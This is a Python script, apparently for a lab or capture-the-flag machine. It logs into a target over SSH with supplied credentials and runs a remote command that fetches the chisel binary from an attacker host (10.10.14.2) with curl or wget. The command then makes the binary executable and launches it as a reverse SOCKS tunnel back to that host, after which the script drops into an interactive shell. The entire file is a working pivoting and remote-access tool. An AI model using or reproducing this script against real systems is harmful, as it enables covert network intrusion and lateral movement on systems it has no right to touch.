import paramiko
import sys

# === CONFIGURATION ===
RHOST = "10.10.x.x"          # Target IP
RUSER = "sshuser"           # SSH username
SSH_PASS = "sshpass"      # Password or use SSH key
PAYLOAD_URL = "http://10.10.14.2:8081/chisel"     # URL to the binary - you could change the url if your tun0 Ip is different 
REMOTE_PATH = "/tmp/chisel"               # Remote location for binary
EXEC_ARGS = "client 10.10.14.2:8000 R:socks"  # Arguments for the binary to connect back to the server with port 8000 

def main():
    print(f"[+] Connecting to {RUSER}@{RHOST}...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    
    try:
        client.connect(RHOST, username=RUSER, password=SSH_PASS)
    except Exception as e:
        print(f"[-] SSH connection failed: {e}")
        return

    command = (
        f"(curl -o {REMOTE_PATH} {PAYLOAD_URL} || wget -O {REMOTE_PATH} {PAYLOAD_URL}) && "
        f"chmod +x {REMOTE_PATH} && "
        f"{REMOTE_PATH} {EXEC_ARGS}"
    )

    print(f"[+] Running remote setup:\n{command}")
    stdin, stdout, stderr = client.exec_command(command)
    stdout.channel.recv_exit_status()
    print("[+] Output:\n", stdout.read().decode())
    err = stderr.read().decode()
    if err:
        print("[-] Error:\n", err)

    print("[+] Dropping into interactive SSH shell...\n")
    try:
        chan = client.invoke_shell()
        interactive_shell(chan)
    except Exception as e:
        print(f"[-] Failed to start shell: {e}")
        client.close()

def interactive_shell(chan):
    import select
    import termios
    import tty

    oldtty = termios.tcgetattr(sys.stdin)
    try:
        tty.setraw(sys.stdin.fileno())
        tty.setcbreak(sys.stdin.fileno())
        chan.settimeout(0.0)

        while True:
            r, w, e = select.select([chan, sys.stdin], [], [])
            if chan in r:
                try:
                    x = chan.recv(1024)
                    if len(x) == 0:
                        print("\r\n*** Connection closed ***\r\n")
                        break
                    sys.stdout.write(x.decode())
                    sys.stdout.flush()
                except Exception:
                    pass
            if sys.stdin in r:
                x = sys.stdin.read(1)
                if len(x) == 0:
                    break
                chan.send(x)
    finally:
        termios.tcsetattr(sys.stdin, termios.TCSADRAIN, oldtty)

if __name__ == "__main__":
    main()

